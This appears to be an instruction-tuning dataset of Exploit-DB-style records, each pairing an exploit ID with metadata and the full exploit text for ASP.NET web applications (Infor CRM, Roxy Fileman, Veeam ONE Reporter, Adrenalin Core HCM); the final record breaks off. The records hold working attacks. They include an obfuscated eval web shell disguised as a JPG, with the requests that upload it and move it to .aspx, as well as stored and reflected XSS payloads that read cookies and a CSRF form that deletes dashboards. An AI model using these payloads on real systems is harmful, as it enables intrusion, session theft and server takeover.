[
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 39497",
        "output": {
            "ID": "39497",
            "File": "exploits/ashx/webapps/39497.txt",
            "Description": "Infor CRM 8.2.0.1136 - Multiple HTML Script Injection Vulnerabilities",
            "Date Published": "2016-02-26",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "ashx",
            "Port": "",
            "Date Added": "2016-02-26",
            "Date Updated": "2016-02-26",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5308.php",
            "Exploit": "\ufeff\nInfor CRM 8.2.0.1136 Multiple HTML Script Injection Vulnerabilities\n\n\nVendor: Infor\nProduct web page: http://www.infor.com\nAffected version: 8.2.0.1136\n\n\nSummary: Infor\u00ae CRM, formerly Saleslogix, is an award-winning\ncustomer relationship management (CRM) solution that provides\na complete view of customer interactions, so your business can\ncollaborate and respond promptly and knowledgably to customer\ninquiries, sales opportunities, and service requests. Infor CRM\nincludes a robust suite of sales, marketing, and service capabilities,\nto offer businesses of all sizes a fast, flexible, and affordable\nsolution for finding, winning, and growing profitable customer\nrelationships.\n\nDesc: Infor CRM suffers from multiple stored cross-site scripting\nvulnerabilities. Input passed to several POST/PUT parameters in\nJSON format is not properly sanitised before being returned to the\nuser. This can be exploited to execute arbitrary HTML and script\ncode in a user's browser session in context of an affected site.\n\nTested on: Microsoft-IIS/8.5\n           ASP.NET/4.0.30319\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2016-5308\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5308.php\n\n\n21.01.2016\n\n---\n\n\n----------------------------------\nAffected parameter(s): description\n----------------------------------\n\nPUT /SLXClient/slxdata.ashx/slx/system/-/attachments(%22eUSERA0004IX%22)?_includeFile=false&format=json&_t=1456358980947 HTTP/1.1\nHost: intranet.zeroscience.mk\n\n\n{$updated: \"/Date(1456359095000)/\", $key: \"eUSERA0004IX\",\u2026}\n\"\": \"\"\n$descriptor: \"\"\n$etag: \"+CgjMLB+0nA=\"\n$httpStatus: 200\n$key: \"eUSERA0004IX\"\n$lookup: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments?format=json\"\n$post: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments?format=json\"\n$schema: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$schema?format=json\"\n$service: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$service?format=json\"\n$template: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$template?format=json\"\n$updated: \"/Date(1456359095000)/\"\n$url: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments('eUSERA0004IX')\"\naccountId: null\nactivityId: null\nattachDate: \"2016-01-25T00:09:39Z\"\ncontactId: null\ncontractId: null\ncreateDate: \"/Date(1456359095000)/\"\ncreateUser: \"UUSERA0005W0\"\ndataType: \"R\"\ndefectId: null\ndescription: \"<img src=j onerror=confirm(document.cookie) >\"\ndetails: {createSource: null}\ndocumentType: null\nfileExists: true\nfileName: \"inforcrm_xss.png\"\nfileSize: 101722\nhistoryId: null\nleadId: null\nmodifyDate: \"/Date(1456359095000)/\"\nmodifyUser: \"UUSERA0005W0\"\nopportunityId: null\nphysicalFileName: \"!eUSERA0004IXinforcrm_xss.png\"\nproductId: null\nremoteStatus: null\nreturnId: null\nsalesOrderId: null\nticketId: null\nurl: null\nuser: {$key: \"UUSERA0005W0\"}\n\n\n\n-----------------------------------------------------------\nAffected parameter(s): Description, Location, and LongNotes\n-----------------------------------------------------------\n\nPOST /SLXClient/slxdata.ashx/slx/system/-/activities?format=json&_t=1456357736977 HTTP/1.1\nHost: intranet.zeroscience.mk\n\n\n{$httpStatus: 200, $descriptor: \"\", ActivityBasedOn: null, Alarm: false,\u2026}\n$descriptor: \"\"\n$httpStatus: 200\nAccountId: null\nAccountName: null\nActivityAttendees: {}\nActivityBasedOn: null\nAlarm: false\nAlarmTime: \"2016-01-24T22:45:00Z\"\nAllowAdd: true\nAllowComplete: true\nAllowDelete: true\nAllowEdit: true\nAllowSync: true\nAppId: null\nAttachment: false\nAttachmentCount: null\nAttendeeCount: 0\nCategory: \"Pleasantville\"\nContactId: null\nContactName: null\nCreateDate: \"/Date(-62135596800000)/\"\nCreateUser: null\nDescription: \"<img src=zsl onerror=prompt(1) >\"\nDetails: {ForeignId1: null, ForeignId2: null, ForeignId3: null, ForeignId4: null, ProjectId: null,\u2026}\nChangeKey: null\nCreateSource: null\nForeignId1: null\nForeignId2: null\nForeignId3: null\nForeignId4: null\nGlobalSyncId: null\nProjectId: null\nTick: null\nUserDef1: null\nUserDef2: null\nUserDef3: null\nDuration: \"0\"\nEndDate: \"/Date(1456359315286)/\"\nLeadId: null\nLeadName: null\nLeader: {$key: \"UUSERA0005W0\", $descriptor: \"Userovich, User\"}\n$descriptor: \"Userovich, User\"\n$key: \"UUSERA0005W0\"\nLocation: \"<img src=zsl onerror=prompt(2) >\"\nLongNotes: \"<img src=zsl onerror=prompt(3) >\"\nModifyDate: \"/Date(-62135596800000)/\"\nModifyUser: null\nNotes: \"Zero Science Lab\"\nOpportunityId: null\nOpportunityName: null\nOriginalDate: \"/Date(1456358415286)/\"\nPhoneNumber: null\nPriority: \"1\"\nProcessId: null\nProcessNode: null\nRecurIterations: 0\nRecurPeriod: 0\nRecurPeriodSpec: 0\nRecurSkip: null\nRecurrenceState: \"rsNotRecurring\"\nRecurring: false\nResources: {}\nRollover: false\nStartDate: \"2016-01-25T00:00:05Z\"\nTicketId: null\nTicketNumber: null\nTimeless: true\nType: \"atToDo\"\nUserActivities: {}\n$url: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/userActivities?format=json&where=Activity.Id%20eq%20%27VUSERA000CZ7%27\"\nUserNotifications: {}\n$url: \"https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/userNotifications?format=json&where=Activity.Id%20eq%20%27VUSERA000CZ7%27\""
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51355",
        "output": {
            "ID": "51355",
            "File": "exploits/ashx/webapps/51355.txt",
            "Description": "Roxy Fileman 1.4.5 -  Arbitrary File Upload",
            "Date Published": "2023-04-10",
            "Author": "Zer0FauLT",
            "Type": "webapps",
            "Platform": "ashx",
            "Port": "",
            "Date Added": "2023-04-10",
            "Date Updated": "2023-04-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Roxy Fileman 1.4.5 -  Arbitrary File Upload\n# Date: 09/04/2023\n# Exploit Author: Zer0FauLT [admindeepsec@proton.me]\n# Vendor Homepage: roxyfileman.com\n# Software Link: https://web.archive.org/web/20190317053437/http://roxyfileman.com/download.php?f=1.4.5-net\n# Version: <= 1.4.5\n# Tested on: Windows 10 and Windows Server 2019\n# CVE : 0DAY\n\n##########################################################################################\n#                First, we upload the .jpg shell file to the server.                     #\n##########################################################################################\n\nPOST /admin/fileman/asp_net/main.ashx?a=UPLOAD HTTP/2\nHost: pentest.com\nCookie: Customer=Id=bkLCsV0Qr6mLH0+CgfcP0w==&Data=/2EMzCCeHGKADtgbKxqVyPZUIM25GBCMMU+Dlc7p8eRUNvoRLZaKEsUclgMRooB3akJsVikb4hTNNkDeE1Dr4Q==; roxyview=list; roxyld=%2FUpload%2FPenTest\nContent-Length: 666\nSec-Ch-Ua: \"Chromium\";v=\"111\", \"Not(A:Brand\";v=\"8\"\nAccept: */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarygOxjsc2hpmwmISeJ\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://pentest.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://pentest.com/admin/fileman/index.aspx\nAccept-Encoding: gzip, deflate\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\n\n------WebKitFormBoundarygOxjsc2hpmwmISeJ\nContent-Disposition: form-data; name=\"action\"\n\nupload\n------WebKitFormBoundarygOxjsc2hpmwmISeJ\nContent-Disposition: form-data; name=\"method\"\n\najax\n------WebKitFormBoundarygOxjsc2hpmwmISeJ\nContent-Disposition: form-data; name=\"d\"\n\n/Upload/PenTest\n------WebKitFormBoundarygOxjsc2hpmwmISeJ\nContent-Disposition: form-data; name=\"files[]\"; filename=\"test.jpg\"\nContent-Type: image/jpeg\n\n\u00e2\u20ac\u00b0PNG\n<%@PAGE LANGUAGE=JSCRIPT EnableTheming = \"False\" StylesheetTheme=\"\" Theme=\"\" %>\n<%var PAY:String=\nRequest[\"\\x61\\x62\\x63\\x64\"];eval\n(PAY,\"\\x75\\x6E\\x73\\x61\"+\n\"\\x66\\x65\");%>\n------WebKitFormBoundarygOxjsc2hpmwmISeJ--\n\n##########################################################################################\n#   In the second stage, we manipulate the .jpg file that we uploaded to the server.     #\n##########################################################################################\n\n{\n\"FILES_ROOT\":          \"\",\n\"RETURN_URL_PREFIX\":   \"\",\n\"SESSION_PATH_KEY\":    \"\",\n\"THUMBS_VIEW_WIDTH\":   \"140\",\n\"THUMBS_VIEW_HEIGHT\":  \"120\",\n\"PREVIEW_THUMB_WIDTH\": \"300\",\n\"PREVIEW_THUMB_HEIGHT\":\"200\",\n\"MAX_IMAGE_WIDTH\":     \"1000\",\n\"MAX_IMAGE_HEIGHT\":    \"1000\",\n\"INTEGRATION\":         \"ckeditor\",\n\"DIRLIST\":             \"asp_net/main.ashx?a=DIRLIST\",\n\"CREATEDIR\":           \"asp_net/main.ashx?a=CREATEDIR\",\n\"DELETEDIR\":           \"asp_net/main.ashx?a=DELETEDIR\",\n\"MOVEDIR\":             \"asp_net/main.ashx?a=MOVEDIR\",\n\"COPYDIR\":             \"asp_net/main.ashx?a=COPYDIR\",\n\"RENAMEDIR\":           \"asp_net/main.ashx?a=RENAMEDIR\",\n\"FILESLIST\":           \"asp_net/main.ashx?a=FILESLIST\",\n\"UPLOAD\":              \"asp_net/main.ashx?a=UPLOAD\",\n\"DOWNLOAD\":            \"asp_net/main.ashx?a=DOWNLOAD\",\n\"DOWNLOADDIR\":         \"asp_net/main.ashx?a=DOWNLOADDIR\",\n\"DELETEFILE\":          \"asp_net/main.ashx?a=DELETEFILE\",\n\"MOVEFILE\":            \"asp_net/main.ashx?a=MOVEFILE\",\n\"COPYFILE\":            \"asp_net/main.ashx?a=COPYFILE\",\n\"RENAMEFILE\":          \"asp_net/main.ashx?a=RENAMEFILE\",\n\"GENERATETHUMB\":       \"asp_net/main.ashx?a=GENERATETHUMB\",\n\"DEFAULTVIEW\":         \"list\",\n\"FORBIDDEN_UPLOADS\":   \"zip js jsp jsb mhtml mht xhtml xht php phtml php3 php4 php5 phps shtml jhtml pl sh py cgi exe application gadget hta cpl msc jar vb jse ws wsf wsc wsh ps1 ps2 psc1 psc2 msh msh1 msh2 inf reg scf msp scr dll msi vbs bat com pif cmd vxd cpl htpasswd htaccess\",\n\"ALLOWED_UPLOADS\":     \"bmp gif png jpg jpeg\",\n\"FILEPERMISSIONS\":     \"0644\",\n\"DIRPERMISSIONS\":      \"0755\",\n\"LANG\":                \"auto\",\n\"DATEFORMAT\":          \"dd/MM/yyyy HH:mm\",\n\"OPEN_LAST_DIR\":       \"yes\"\n}\n\n############################################################################################################################################################################################################################\n#   We say change the file name and we change the relevant \"asp_net/main.ashx?a=RENAMEFILE\" parameter with the \"asp_net/main.ashx?a=MOVEFILE\" parameter and manipulate the paths to be moved on the server as follows.     #\n############################################################################################################################################################################################################################\n\nPOST /admin/fileman/asp_net/main.ashx?a=RENAMEFILE&f=%2FUpload%2FPenTest%2Ftest.jpg&n=test.aspx HTTP/2\nHost: pentest.com\nCookie: Customer=Id=bkLCsV0Qr6mLH0+CgfcP0w==&Data=/2EMzCCeHGKADtgbKxqVyPZUIM25GBCMMU+Dlc7p8eRUNvoRLZaKEsUclgMRooB3akJsVikb4hTNNkDeE1Dr4Q==; roxyview=list; roxyld=%2FUpload%2FPenTest\nContent-Length: 44\nSec-Ch-Ua: \"Chromium\";v=\"111\", \"Not(A:Brand\";v=\"8\"\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://pentest.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://pentest.com/admin/fileman/index.aspx\nAccept-Encoding: gzip, deflate\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\n\nf=%2FUpload%2FPenTest%2Ftest.jpg&n=test.aspx\n\n===========================================================================================================================================================================================================================\n\nPOST /admin/fileman/asp_net/main.ashx?a=MOVEFILE&f=%2FUpload%2FPenTest%2Ftest.jpg&n=%2FUpload%2FNewFolder%2Ftest.aspx HTTP/2\nHost: pentest.com\nCookie: Customer=Id=bkLCsV0Qr6mLH0+CgfcP0w==&Data=/2EMzCCeHGKADtgbKxqVyPZUIM25GBCMMU+Dlc7p8eRUNvoRLZaKEsUclgMRooB3akJsVikb4hTNNkDeE1Dr4Q==; roxyview=list; roxyld=%2FUpload%2FPenTest\nContent-Length: 68\nSec-Ch-Ua: \"Chromium\";v=\"111\", \"Not(A:Brand\";v=\"8\"\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://pentest.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://pentest.com/admin/fileman/index.aspx\nAccept-Encoding: gzip, deflate\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\n\nf=%2FUpload%2FPenTest%2Ftest.jpg&n=%2FUpload%2FNewFolder%2Ftest.aspx\n\n##########################################################################################\n#                                 and it's done!                                         #\n##########################################################################################\n\nHTTP/2 200 OK\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nVary: Accept-Encoding\nServer: Microsoft-IIS/10.0\nX-Aspnet-Version: 4.0.30319\nX-Powered-By-Plesk: PleskWin\nDate: Sun, 09 Apr 2023 09:49:34 GMT\nContent-Length: 21\n\n{\"res\":\"ok\",\"msg\":\"\"}\n\n============================================================================================="
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46765",
        "output": {
            "ID": "46765",
            "File": "exploits/ashx/webapps/46765.txt",
            "Description": "Veeam ONE Reporter 9.5.0.3201 - Multiple Cross-Site Request Forgery",
            "Date Published": "2019-04-30",
            "Author": "Seyed Sadegh Khatami",
            "Type": "webapps",
            "Platform": "ashx",
            "Port": "",
            "Date Added": "2019-04-30",
            "Date Updated": "2019-04-30",
            "Verified": "0",
            "Codes": [
                "CVE-2019-11569"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Veeam ONE Reporter - Cross-Site Request Forgery (All Actions/Methods)\n# Exploit Author: Seyed Sadegh Khatami\n# Website: https://www.cert.ir\n# Date: 2019-04-27\n# Google Dork: N/A\n# Vendor Homepage: https://www.veeam.com/\n# Software Link: https://www.veeam.com/virtual-server-management-one-free.html\n# Version: 9.5.0.3201\n# Tested on: Windows Server 2016\n\n\n#exploit:\n<form id='del' method='POST' action='https://[target_URL]:1239/CommonDataHandlerReadOnly.ashx'>\n  <input name='f'  id='dd'>\n</form>\n\n<script>\ndocument.getElementById(\"dd\").value= JSON.stringify({\n            id: '1',\n            method: 'deleteDashboard',\n            params:{ 'id' : 21}\n          });\n\n document.getElementById(\"del\").submit();\n</script>\n\n\n##########################################\n#all methods is vulnerable\n##########################################\n#addDashboard(p)\n#addDashboardUser(par)\n#addDashboardUserList(par)\n#applySchedulingForDashboard(dashboardId, taskId, config)\n#applySchedulingForFolder(folderId, taskId, config)\n#applySchedulingForReport(reportId, taskId, vmr, config)\n#canModifyDashboard(id)\n#captureContainer(data, taskId)\n#changeObjectVisibility(objectId, visible)\n#checkForUpdateReportPack(confirm)\n#checkIfAdmin()\n#checkUserPermissionsResolved(o)\n#checkWinVersion()\n#clearContainer()\n#connectToSqlServer(data, save)\n#DBExecuteProcedure(db)\n#DBStoreLoad(db)\n#DBStoreSave(db)\n#deleteDashboard(id)\n#deleteDashboardImage(imageId)\n#deleteDashboardWidget(p)\n#DeleteFolder(param)\n#deleteReportPack(name, id, type)\n#deleteTask(id)\n#doLogin(domain, login, password)\n#editDashboard(p)\n#emptyDashboardRecycleBin(o)\n#findDashboardUsers(p)\n#getAboutData()\n#getActionParameters()\n#getAdvancedData()\n#getAlarms()\n#getAllSchedulingsForDashboard(info)\n#getAllSchedulingsForFolder(info)\n#getAllSchedulingsForReport(info)\n#getBackUpTree(wsj)\n#getBusinessViewTree(wsj)\n#getComboData()\n#getCommonGridItem()\n#getConfiguration()\n#getConfigurationOverview(id)\n#getConnectedServersGridItem()\n#getDashboardData(dashboard_id)\n#getDashboardImages(p)\n#getDashboardPermissions(p)\n#getDashboardPredefiniedReports(p)\n#getDashboards(p)\n#getDashboardSSRSChartTypes(p)\n#getDashboardUserList(p)\n#getDashboardWidgetTypeData(p)\n#getDefaultUserName()\n#getDeletedDashboards(p)\n#getEnumeratingTaskContainers(id)\n#getEnumeratingTaskProperties(id)\n#getEnumeratingTaskScheduling(id)\n#getExtensionModules(p)\n#getIgnoredDatastores(p)\n#getIgnoredDatastoresDetails(p)\n#getInfrastructureTree(wsj)\n#getIsReporterFreeVersion()\n#getJobData(id)\n#getLicenseData()\n#getLicensedHVSockets(p)\n#getLicensedVMSockets(p)\n#getMetadata(query, reload)\n#getNeedToDisableTabs()\n#getNotificationData()\n#getObjectsToHide(p)\n#getOptionList()\n#getReportFilters(param)\n#getReportImageName()\n#getReportListTreeCheckbox(wsj)\n#getReportListTreeDashboard(wsj)\n#getReportListTreeWorkspace(wsj)\n#getReportManagementTree(wsj)\n#getReportsSectionsTree(wsj)\n#getReportStatistics(param)\n#getScheduleDashboardConfig(dashboardId, taskId)\n#getScheduleFolderConfig(folderId, taskId)\n#getScheduleReportConfig(reportId, taskId, packType)\n#getScriptArgumentList()\n#getServerScopeAll(wsj)\n#getSessionDetails(idwithtype)\n#getSessions(p)\n#getSessionsTaskTypes(p)\n#getSiteStatusGridItem()\n#getSmtpServerData()\n#getSqlServerData()\n#getSsrsServerData()\n#getSSRSStatus()\n#getStartStopDeleteButtonsEnabled(id)\n#getStatistics()\n#getTaskList(p)\n#getUpdateSessionInfo(o)\n#getvCloudList(p)\n#getVideoReportData(interval, intervalPeriod, scope)\n#getVmStatus()\n#getWidgetCustomChartConstructorData(p)\n#getWidgetData(r)\n#getWidgetList(item)\n#getWidgetPackList(j)\n#getWidgetParams(uid)\n#getWorkspace()\n#getWorkspaceReportGridItems(param)\n#isSmtpConfigured()\n#publishDashboard(id, publish)\n#recalculateProjects(ids)\n#removeDashboardUser(par)\n#resetReportImageName()\n#resetSchedulingForDashboard(dashboardId, taskId)\n#resetSchedulingForDashboardArray(dashboardId, taskId)\n#resetSchedulingForFolder(folderId)\n#resetSchedulingForReport(reportId, vmr)\n#resetSchedulingTaskForFolder(folderId, taskId)\n#resetSchedulingTaskForReport(reportId, taskId, vmr)\n#resetSchedulingTasksForFolderArray(folderId, taskId)\n#resetSchedulingTasksForReportArray(reportId, taskId, vmr)\n#restoreDashboard(p)\n#revokeHost(hostName)\n#revokeHostHV(hostName)\n#SaveFolder(param)\n#saveIgnoredDatastores(taskContainerId, dataStores)\n#saveSchedulingInfo(taskId, taskProp)\n#saveTask(taskProp, taskContainers, excludes)\n#sendNotificationAboutDashboardSharing(to, subject, dashboardName, dashboardUrl, permissionLevel)\n#sendTestMessage(data, setting)\n#setAdvancedData(measure)\n#setComboData(data)\n#setDashboardUserPermissions(par)\n#setDashboardWidget(p)\n#SetDragAndDropPosition(dwid, colIndex, position, height)\n#setSchedulingEnability(dashboardId, taskId, disabled)\n#setSchedulingEnabilityArray(dashboardId, taskId, disabled)\n#setSchedulingEnabilityForFolder(folderId, taskId, disabled)\n#setSchedulingEnabilityForFolderArray(folderId, taskId, disabled)\n#setSchedulingEnabilityForReport(reportId, taskId, disabled)\n#setSchedulingEnabilityForReportArray(reportId, taskId, disabled)\n#setSmtpServerData(data)\n#setSsrsServerData(data)\n#startTask(id)\n#stopTask(id)\n#system.about()\n#    Returns a summary about the server implementation for display purposes.\n#system.listMethods()\n#    Returns an array of method names implemented by this service.\n#system.version()\n#    Returns the version server implementation using the major, minor, build and revision format.\n#testServer(tcd)\n#testSsrsConnection(data)\n#updateDashboardPosition(p)\n#updateTreeExpandedStates(wsj, a)\n#validateTaskName(tcd, id)\n##########################################"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46766",
        "output": {
            "ID": "46766",
            "File": "exploits/ashx/webapps/46766.txt",
            "Description": "Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-Site Scripting",
            "Date Published": "2019-04-30",
            "Author": "Seyed Sadegh Khatami",
            "Type": "webapps",
            "Platform": "ashx",
            "Port": "",
            "Date Added": "2019-04-30",
            "Date Updated": "2019-04-30",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Veeam ONE Reporter - Stored Cross-site Scripting (Stored XSS)\n# Exploit Author: Seyed Sadegh Khatami\n# Website: https://www.cert.ir\n# Date: 2019-04-27\n# Google Dork: N/A\n# Vendor Homepage: https://www.veeam.com/\n# Software Link: https://www.veeam.com/virtual-server-management-one-free.html\n# Version: 9.5.0.3201\n# Tested on: Windows Server 2016\n\n\n#exploit:\n\nPath: /CommonDataHandlerReadOnly.ashx\n\nmethod: addDashboard / editDashboard\n\nSET Description(config) field to \u201cAAAAAAA</div><img src=S onerror=alert('KHATAMI');><div>\u201d"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46767",
        "output": {
            "ID": "46767",
            "File": "exploits/ashx/webapps/46767.txt",
            "Description": "Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-site Scripting (Add/Edit Widget)",
            "Date Published": "2019-04-30",
            "Author": "Seyed Sadegh Khatami",
            "Type": "webapps",
            "Platform": "ashx",
            "Port": "",
            "Date Added": "2019-04-30",
            "Date Updated": "2019-04-30",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Veeam ONE Reporter - Stored Cross-site Scripting (Add/Edit Widget)\n# Exploit Author: Seyed Sadegh Khatami\n# Website: https://www.cert.ir\n# Date: 2019-04-27\n# Google Dork: N/A\n# Vendor Homepage: https://www.veeam.com/\n# Software Link: https://www.veeam.com/virtual-server-management-one-free.html\n# Version: 9.5.0.3201\n# Tested on: Windows Server 2016\n\n\n#exploit:\n\nPath: /CommonDataHandlerReadOnly.ashx\n\nmethod: setDashboardWidget\n\nSET Caption field to \u201cAAAAAAAA</div><img src=S onerror=alert('KHATAMI');><div>\u201d"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47613",
        "output": {
            "ID": "47613",
            "File": "exploits/aspx/webapps/47613.txt",
            "Description": "Adrenalin Core HCM 5.4.0 - 'prntDDLCntrlName' Reflected Cross-Site Scripting",
            "Date Published": "2019-11-12",
            "Author": "Cy83rl0gger",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-11-12",
            "Date Updated": "2019-11-12",
            "Verified": "0",
            "Codes": [
                "CVE-2018-12650"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Adrenalin Core HCM 5.4.0 - 'prntDDLCntrlName' Reflected Cross-Site Scripting\n# Google Dork: NA\n# Date: 2018-09-06\n# Exploit Author: Rishu Ranjan (Cy83rl0gger)\n# Vendor Homepage: https://www.myadrenalin.com/\n# Software Link: https://www.myadrenalin.com/core-hcm/\n# Version: 5.4.0 (REQUIRED)\n# Tested on: NA\n# CVE : CVE-2018-12650\n# Type: webapps\n# Platform: Multiple\n\n# Description\n# ====================\n# A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Adrenalin Core HCM v5.4.0 HRMS Software.\n# The user supplied input containing malicious JavaScript is echoed back as it is in JavaScript code in an HTML response.\n\nURL\n====================\nhttps://<Host:port>/myadrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined\n\nhttps://<Host:port>/Adrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined\n\nParameter\n====================\nprntDDLCntrlName\nprntFrmName\n\nAttack Type\n====================\nRemote\n\nCVE Impact Other\n====================\nAllows an attacker to input malicious JavaScript which can steal cookie, redirect them to other malicious website, etc.\n\nReference\n====================\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-12650\nhttps://www.knowcybersec.com/2018/10/CVE-2018-12650-reflected-XSS.html\n\nDiscoverer\n====================\nRishu Ranjan"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47643",
        "output": {
            "ID": "47643",
            "File": "exploits/aspx/webapps/47643.txt",
            "Description": "Adrenalin Core HCM 5.4.0 - 'ReportID' Reflected Cross-Site Scripting",
            "Date Published": "2019-11-12",
            "Author": "Cy83rl0gger",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-11-12",
            "Date Updated": "2019-11-12",
            "Verified": "0",
            "Codes": [
                "CVE-2018-12653"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Adrenalin Core HCM 5.4.0 - 'ReportID' Reflected Cross-Site Scripting\n# Google Dork: NA\n# Date: 2018-09-06\n# Exploit Author: Rishu Ranjan\n# Vendor Homepage: https://www.myadrenalin.com/\n# Software Link: https://www.myadrenalin.com/core-hcm/\n# Version: 5.4.0 (REQUIRED)\n# Tested on: NA\n# CVE : CVE-2018-12653\n# Type: webapps\n# Platform: Multiple\n\n# Description\n# ====================\n# A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in\n# Adrenalin Core HCM v5.4.0 HRMS Software. The user supplied input containing\n# malicious JavaScript is echoed back as it is in JavaScript code in an HTML\n# response.\n\nURL\n====================\nhttps://\n<HOST:PORT>/myadrenalin/RPT/SSRSDynamicEditReports.aspx?ReportId=109LWFREPORT.RDL15822%27%3balert(%22Reflected%20XSS%22)%2f%2f773&Export=0\n\nParameter\n====================\nReportId\n\nAttack Type\n====================\nRemote\n\nCVE Impact Other\n====================\nAllows an attacker to input malicious JavaScript which can steal cookie,\nredirect them to other malicious website, etc.\n\nReference\n====================\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-12653\nhttps://www.knowcybersec.com/2019/02/CVE-2018-12653-reflected-XSS.html\n\nDiscoverer\n====================\nRishu Ranjan"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47611",
        "output": {
            "ID": "47611",
            "File": "exploits/aspx/webapps/47611.txt",
            "Description": "Adrenalin Core HCM 5.4.0 - 'strAction' Reflected Cross-Site Scripting",
            "Date Published": "2019-11-12",
            "Author": "Cy83rl0gger",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-11-12",
            "Date Updated": "2019-11-12",
            "Verified": "0",
            "Codes": [
                "CVE-2018-12234"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
